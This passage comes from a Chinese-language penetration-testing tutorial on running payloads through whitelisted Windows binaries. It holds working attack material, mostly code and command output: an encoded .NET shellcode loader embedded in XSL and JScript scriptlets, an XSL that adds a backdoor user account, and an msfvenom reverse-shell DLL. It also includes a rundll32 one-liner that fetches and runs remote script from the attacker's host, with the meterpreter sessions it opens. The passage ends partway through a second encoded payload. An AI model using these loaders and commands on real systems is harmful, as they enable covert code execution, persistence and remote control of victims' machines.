<span class="token string">"Qnl0ZQA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz57MEQxQTVERjAtRDZCNy00RUUzLUJB"</span><span class="token operator">+</span>
<span class="token string">"QzItOTY0MUUyREJCMDNFfQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBWYWx1ZVR5cGUAX19T"</span><span class="token operator">+</span>
<span class="token string">"dGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zNDEAJCRtZXRob2QweDYwMDAwMDItMQBSdW50aW1lSGVs"</span><span class="token operator">+</span>
<span class="token string">"cGVycwBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW5pdGlhbGl6ZUFycmF5AEludFB0cgBvcF9F"</span><span class="token operator">+</span>
<span class="token string">"eHBsaWNpdABTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWFyc2hhbABDb3B5AFplcm8A"</span><span class="token operator">+</span>
<span class="token string">"RGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAC5jY3RvcgBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJp"</span><span class="token operator">+</span>
<span class="token string">"ZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAPBdGg231uNOusKWQeLbsD4ACLd6XFYZNOCJ"</span><span class="token operator">+</span>
<span class="token string">"AyAAAQMAAAECBgkHAAQJCQkJCQoABhgJCQkYCRAJBQACCRgJBSABARENBCABAQgEAQAAAAMGERAH"</span><span class="token operator">+</span>
<span class="token string">"AAIBEikRLQQAARgKCAAEAR0FCBgIAgYYCAcFHQUJGAkYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldy"</span><span class="token operator">+</span>
<span class="token string">"YXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNl"</span><span class="token operator">+</span>
<span class="token string">"Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs"</span><span class="token operator">+</span>
<span class="token string">"dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVy"</span><span class="token operator">+</span>
<span class="token string">"aWZpY2F0aW9uAQAAAOgpAAAAAAAAAAAAAP4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwKQAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW"</span><span class="token operator">+</span>
<span class="token string">"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA"</span><span class="token operator">+</span>
<span class="token string">"RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE"</span><span class="token operator">+</span>
<span class="token string">"AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A"</span><span class="token operator">+</span>
<span class="token string">"AAAAADAALgAwAC4AMAAuADAAAABQABcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHcAbQBp"</span><span class="token operator">+</span>
<span class="token string">"AF8AYwBzAF8AZABsAGwAXwBwAGEAeQBsAG8AYQBkAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEA"</span><span class="token operator">+</span>
<span class="token string">"bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu"</span><span class="token operator">+</span>
<span class="token string">"AGEAbQBlAAAAdwBtAGkAXwBjAHMAXwBkAGwAbABfAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB"</span><span class="token operator">+</span>
<span class="token string">"AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"</span><span class="token operator">+</span>
<span class="token string">"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA"</span><span class="token punctuation">;</span>

var entry_class <span class="token operator">=</span> <span class="token string">'ShellCodeLauncher.Program'</span><span class="token punctuation">;</span> 

try <span class="token punctuation">{</span>

<span class="token function">setversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

var stm <span class="token operator">=</span> <span class="token function">base64ToStream</span><span class="token punctuation">(</span>serialized_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

var fmt <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

var al <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'System.Collections.ArrayList'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

var d <span class="token operator">=</span> fmt<span class="token punctuation">.</span><span class="token function">Deserialize_2</span><span class="token punctuation">(</span>stm<span class="token punctuation">)</span><span class="token punctuation">;</span>

al<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span><span class="token punctuation">;</span>

var o <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">DynamicInvoke</span><span class="token punctuation">(</span>al<span class="token punctuation">.</span><span class="token function">ToArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>entry_class<span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token punctuation">}</span> catch <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>

<span class="token function">debug</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span> 

<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>ms<span class="token punctuation">:</span>script<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>stylesheet<span class="token operator">&gt;</span>
</code></pre>
<p><strong>Micropoor_2003.xsl:</strong></p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">'1.0'</span><span class="token operator">?</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>stylesheet

xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/XSL/Transform"</span> xmlns<span class="token punctuation">:</span>ms<span class="token operator">=</span><span class="token string">"urn:schemas‐microsoft‐com:xslt"</span>

xmlns<span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token string">"placeholder"</span>

version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>output method<span class="token operator">=</span><span class="token string">"text"</span><span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>ms<span class="token punctuation">:</span>script implements‐prefix<span class="token operator">=</span><span class="token string">"user"</span> language<span class="token operator">=</span><span class="token string">"JScript"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span> 

var r <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WScript.Shell"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"net user Micropoor Micropoor /add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>ms<span class="token punctuation">:</span>script<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>stylesheet<span class="token operator">&gt;</span>
</code></pre>
<hr>
<h2><a id="1111_Rundll32exepayload_1744"></a>11.11 基于白名单Rundll32.exe执行payload（十一）</h2>
<p><strong>Rundll32简介：</strong></p>
<p>Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。</p>
<p>说明：Rundll32.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Rundll32调用。</p>
<p><strong>Windows 2003 默认位置：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\rundll32<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\rundll32<span class="token punctuation">.</span>exe
</code></pre>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\rundll32<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\rundll32<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：<br>
192.168.1.4 Debian</p>
<p>靶机：<br>
192.168.1.119 Windows 2003<br>
192.168.1.5 Windows 7</p>
<p><strong>基于远程加载（1）：</strong></p>
<p><strong>配置攻击机msf：</strong><br>
注：x86 payload</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span>

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port 

Exploit target<span class="token punctuation">:</span> 

Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101016532178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\SysWOW64\rundll32<span class="token punctuation">.</span>exe javascript<span class="token punctuation">:</span><span class="token string">"\..\mshtml,RunHTMLApplication"</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">GetObject</span><span class="token punctuation">(</span><span class="token string">"script:http://192.168.1.4/Rundll32_shellcode"</span><span class="token punctuation">)</span>
</code></pre>
<p>注：x64 rundll32.exe<br>
<img src="https://img-blog.csdnimg.cn/20201010165334730.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">57</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">41274</span><span class="token punctuation">)</span>
at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">19</span> <span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">26</span> ‐<span class="token number">0500</span>
meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> John‐PC\John
meterpreter <span class="token operator">&gt;</span> getpid
Current pid<span class="token punctuation">:</span> <span class="token number">7064</span>
meterpreter <span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010165358363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>基于本地加载（2）：</strong></p>
<p>payload配置：</p>
<pre><code class="prism language-c">msfvenom ‐a x86 ‐‐platform windows ‐p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐f dll <span class="token operator">&gt;</span> Micropoor_Rundll32<span class="token punctuation">.</span>dll
</code></pre>
<p><strong>靶机执行：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201010165431252.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">63</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">43320</span><span class="token punctuation">)</span>
at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">19</span> <span class="token number">04</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token number">59</span> ‐<span class="token number">0500</span>
meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> John‐PC\John
meterpreter <span class="token operator">&gt;</span> getpid
Current pid<span class="token punctuation">:</span> <span class="token number">6656</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010165455394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>基于命令执行（3）：</strong></p>
<p><strong>靶机执行：</strong></p>
<p>Windows 2003：</p>
<pre><code class="prism language-c">rundll32<span class="token punctuation">.</span>exe javascript<span class="token punctuation">:</span><span class="token string">"\..\mshtml.dll,RunHTMLApplication "</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"w=new ActiveXObject(\"WScript.Shell\");w.run(\"mstsc\");window.close()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>注：如靶机支持powershell，调用powershell更贴合实战。<br>
<img src="https://img-blog.csdnimg.cn/2020101016553613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
附录：Rundll32_shellcode</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token operator">?</span><span class="token operator">&gt;</span> 
<span class="token operator">&lt;</span>package<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>component id<span class="token operator">=</span><span class="token string">"Micropoor"</span><span class="token operator">&gt;</span> 

<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"JScript"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span>
function <span class="token function">setversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
function <span class="token function">debug</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
function <span class="token function">base64ToStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
var enc <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.Text.ASCIIEncoding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var length <span class="token operator">=</span> enc<span class="token punctuation">.</span><span class="token function">GetByteCount_2</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
var ba <span class="token operator">=</span> enc<span class="token punctuation">.</span><span class="token function">GetBytes_4</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
var transform <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.Security.Cryptography.FromBase64Transform"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ba <span class="token operator">=</span> transform<span class="token punctuation">.</span><span class="token function">TransformFinalBlock</span><span class="token punctuation">(</span>ba<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>
var ms <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.IO.MemoryStream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ms<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>ba<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>length <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ms<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> ms<span class="token punctuation">;</span>
<span class="token punctuation">}</span> 

var serialized_obj <span class="token operator">=</span> <span class="token string">"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"</span><span class="token operator">+</span>
<span class="token string">"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"</span><span class="token operator">+</span>
<span class="token string">"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"</span><span class="token operator">+</span>
<span class="token string">"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"</span><span class="token operator">+</span>
<span class="token string">"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"</span><span class="token operator">+</span>
<span class="token string">"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"</span><span class="token operator">+</span>
<span class="token string">"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"</span><span class="token operator">+</span>
<span class="token string">"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"</span><span class="token operator">+</span>
<span class="token string">"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"</span><span class="token operator">+</span>
<span class="token string">"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"</span><span class="token operator">+</span>
<span class="token string">"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"</span><span class="token operator">+</span>
<span class="token string">"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"</span><span class="token operator">+</span>
<span class="token string">"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"</span><span class="token operator">+</span>
<span class="token string">"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"</span><span class="token operator">+</span>
<span class="token string">"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"</span><span class="token operator">+</span>
<span class="token string">"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"</span><span class="token operator">+</span>
<span class="token string">"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"</span><span class="token operator">+</span>
<span class="token string">"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"</span><span class="token operator">+</span>
<span class="token string">"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"</span><span class="token operator">+</span>
